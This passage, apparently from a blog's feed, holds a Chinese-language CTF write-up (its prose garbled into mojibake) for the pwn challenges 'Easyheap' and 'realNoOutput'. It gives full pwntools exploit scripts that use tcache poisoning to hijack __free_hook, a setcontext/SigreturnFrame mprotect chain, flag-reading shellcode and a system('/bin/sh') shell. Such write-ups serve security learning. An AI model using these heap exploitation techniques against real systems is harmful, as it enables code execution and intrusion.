rdi</span></span><br><span class="line"><span class="string">mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov rax, 0</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">jmp rsi</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804194358784.png" alt="free_hookå‘¨å›´å€¼"></p><p>æˆ‘ä»¬å†å°†æˆ‘ä»¬æ¥ä¸‹æ¥è¦freeçš„chunkå†…å¡«ä¸Šæˆ‘ä»¬éœ€è¦çš„å€¼ï¼š</p><p>å°†rspèµ‹å€¼ä¸ºæˆ‘ä»¬ä¹‹å‰å¸ƒç½®å¥½çš„free_hook+0x18ï¼Œå…¶æŒ‡å‘shellcodeï¼Œè¿™æ ·setcontentæ‰§è¡Œå®Œå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬çš„shellcode</p><p>å…¶ä»–çš„rdiï¼Œrsiï¼Œrdxï¼Œripï¼Œéƒ½æ˜¯ä¸ºäº†æ”¹å†™free_hookå¯¹åº”é¡µçš„æƒé™ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">frame.rdi = new_addr</span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210804195139417.png" alt="image-20210804195139417"></p><p>æ¥ä¸‹æ¥å½“setcontentæ‰§è¡Œå®Œï¼ŒæŒ‡é’ˆä¼šè·³è½¬åˆ°æˆ‘ä»¬free_hooké™„è¿‘å†™ä¸‹çš„shellcodeä¸­ï¼Œ<strong>shellcodeä¼šè°ƒç”¨readå‡½æ•°</strong>ï¼Œä¼šåœ¨æˆ‘ä»¬free_hooké¡µè®©æˆ‘ä»¬å†™å…¥shellocodeå¹¶è·³è½¬æ‰§è¡Œã€‚æˆ‘ä»¬å†™å…¥ä¸€ä¸ªæ ‡å‡†çš„orwå³å¯ã€‚è¿™ä¸€éƒ¨åˆ†æ¯”è¾ƒæ¨¡æ¿åŒ–ï¼Œå¯ä»¥è®°å½•ä¸‹æ¥ï¼Œä»¥åç¨åŠ æ”¹é€ å°±å¯ä»¥å†æ¬¡ä½¿ç”¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">xor rdx, rdx ;</span></span><br><span class="line"><span class="string">mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">mov rax, 60</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sl(io,asm(shellcode2))</span><br></pre></td></tr></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./Easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line">one_gadget=[<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./Easyheap&#x27;)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">fake_size,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(fake_size))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sla(io,<span class="string">&#x27;&gt;&gt; :&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(io,<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(io,<span class="string">&#x27;Content:&#x27;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        add(<span class="number">0x90</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#0-6</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x90</span>)<span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;interval&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">7</span>):</span><br><span class="line">        dele(i)</span><br><span class="line">    dele(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">    libc.address=un_addr-<span class="number">0x3ebca0</span></span><br><span class="line">    success(<span class="string">&#x27;libc.address : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;malloc_hook : &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">    free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">    system_addr=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    set_context=libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    pause()</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(free_hook)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;free&#x27;</span>)<span class="comment">#free_hook 1</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    new_addr =  free_hook &amp;<span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">    shellcode1 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor rdi, rdi</span></span><br><span class="line"><span class="string">    mov rsi, &#123;&#125;</span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    mov rax, 0</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    jmp rsi</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(new_addr)</span><br><span class="line">    edit(<span class="number">1</span>,p64(set_context+<span class="number">53</span>)+p64(free_hook+<span class="number">0x18</span>)*<span class="number">2</span>+asm(shellcode1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rsp = free_hook+<span class="number">0x10</span></span><br><span class="line">    frame.rdi = new_addr</span><br><span class="line">    frame.rsi = <span class="number">0x1000</span></span><br><span class="line">    frame.rdx = <span class="number">7</span></span><br><span class="line">    frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="built_in">str</span>(frame))</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">0</span>)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    shellcode2 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax, 0x67616c662f ;// /flag</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rsp ;// /flag</span></span><br><span class="line"><span class="string">    mov rsi, 0 ;// O_RDONLY</span></span><br><span class="line"><span class="string">    xor rdx, rdx ;</span></span><br><span class="line"><span class="string">    mov rax, 2 ;// SYS_open</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, rax ;// fd </span></span><br><span class="line"><span class="string">    mov rsi,rsp  ;</span></span><br><span class="line"><span class="string">    mov rdx, 1024 ;// nbytes</span></span><br><span class="line"><span class="string">    mov rax,0 ;// SYS_read</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 1 ;// fd </span></span><br><span class="line"><span class="string">    mov rsi, rsp ;// buf</span></span><br><span class="line"><span class="string">    mov rdx, rax ;// count </span></span><br><span class="line"><span class="string">    mov rax, 1 ;// SYS_write</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0 ;// error_code</span></span><br><span class="line"><span class="string">    mov rax, 60</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    sl(io,asm(shellcode2))</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><h1 id="realNoOutput"><a href="#realNoOutput" class="headerlink" title="realNoOutput"></a>realNoOutput</h1><h2 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165752186.png" alt="add"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<strong>idxçš„èŒƒå›´æ˜¯0-9ï¼Œä¸€å…±10ä¸ªchunk</strong>ï¼Œæˆ‘ä»¬çœ‹çœ‹å®ƒçš„sizeæ•°ç»„å’Œaddræ•°ç»„</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805165924643.png" alt="size&amp;addr"></p><p>å‘ç°å…¶<strong>sizeæ•°ç»„å¤§å°ä¸º8</strong>ï¼Œè¯´æ˜æ•°ç»„sizeå¤§å°æœ‰é—®é¢˜ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170703356.png" alt="delete"></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170814359.png" alt="edit"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šå›¾editå‡½æ•°é‡Œå¦‚æœä¸æ‰§è¡Œifå‡½æ•°ä»ç„¶å¯ä»¥å€ŸåŠ©æ ˆé‡Œæ®‹ç•™çš„å€¼æ¥è¿›è¡Œèµ‹å€¼ï¼Œä»è€Œå®ç°uaf</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805170836608.png" alt="show"></p><h2 id="è„šæœ¬ç¼–å†™-1"><a href="#è„šæœ¬ç¼–å†™-1" class="headerlink" title="è„šæœ¬ç¼–å†™"></a>è„šæœ¬ç¼–å†™</h2><p>æˆ‘ä»¬å…ˆæ¥æ³„éœ²å…¶libcï¼Œç”±äºchunkç”³è¯·å‡ºæ¥çš„æ—¶å€™æ²¡æœ‰æ¸…ç†å†…å­˜ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†æ”¾åœ¨unsorted_binä¸­çš„chunkç”³è¯·å‡ºæ¥ï¼Œå¾—åˆ°libcåŸºåœ°å€ã€‚å…ˆå¡«æ»¡tcache</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805163202933.png" alt="è·å–åŸºåœ°å€"></p><p>å†æ³„éœ²ä¸€äº›æˆ‘ä»¬éœ€è¦çš„å‡½æ•°åœ°å€</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥éœ€è¦çš„å°±æ˜¯åŠ«æŒfree_hookæ¥è·å–shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure><p>chunk1å’Œ2æ˜¯ä¸ºäº†å¡«å……tcacheï¼Œchunk3æ˜¯ä¸ºäº†åé¢åŠ«æŒfree_hookåˆ°systemä½œä¸ºå‚æ•°ä½¿ç”¨çš„ã€‚</p><p>è‡³äºchunk8æ˜¯ä¸ºäº†å°†chunk0çš„heap_addrèµ‹å€¼ï¼Œç”±äºæ•°ç»„è¶Šç•Œï¼Œæˆ‘ä»¬çš„chunk8çš„sizeä¼šä½œä¸ºchunk0çš„åœ°å€ä½¿ç”¨ã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205403681.png" alt="addræ•°ç»„"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦åŠ«æŒfree_hookäº†ï¼Œå…ˆå°†free_hookæ”¾åœ¨tcacheçš„é“¾è¡¨ä¸Š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œeditçš„åœ°å€å¹¶ä¸æ˜¯chunk0çš„è€Œæ˜¯å·²ç»è¢«freeçš„chunk2é—ç•™åœ¨æ ˆä¸Šçš„ï¼Œæ‰€ä»¥è¿™é‡Œæ„é€ äº†ä¸€ä¸ªuafã€‚</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210805205633751.png" alt="åŠ«æŒfree_hook"></p><p>å‰©ä¸‹çš„äº‹æƒ…å°±ç®€å•äº†æˆ‘ä»¬å°†free_hookç”³è¯·å‡ºæ¥ï¼Œå°†å…¶ä¿®æ”¹ä¸ºsystemçš„åœ°å€ï¼Œç„¶ådeleteä¹‹å‰å‡†å¤‡å¥½å†™æœ‰â€/bin/sh\x00â€çš„å †å—ï¼Œå³å¯æ‹¿å–shellã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./realNoOutput&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,27832)</span></span><br><span class="line"><span class="comment">#io=gdb.debug(&#x27;./test&#x27;,&#x27;b *0x080492D4&#x27;)</span></span><br><span class="line"><span class="comment">#one_gadget=[0x4f3d5,0x4f432,0x10a41c]</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./realNoOutput&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,29826)</span></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(size))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,cont)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    sl(io,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    dele(<span class="number">7</span>-i)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x10</span>,<span class="string">b&#x27;aaaaaaa&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">un_addr=u64(ru(io,<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;un_addr : &#x27;</span>+<span class="built_in">hex</span>(un_addr))</span><br><span class="line">libc.address=un_addr-<span class="number">0x1ebce0</span></span><br><span class="line">success(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;system : &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;free_hook : &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> X86/x64pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå…¥é—¨æŒ‡å—</title>
      <link href="/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2021/07/19/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
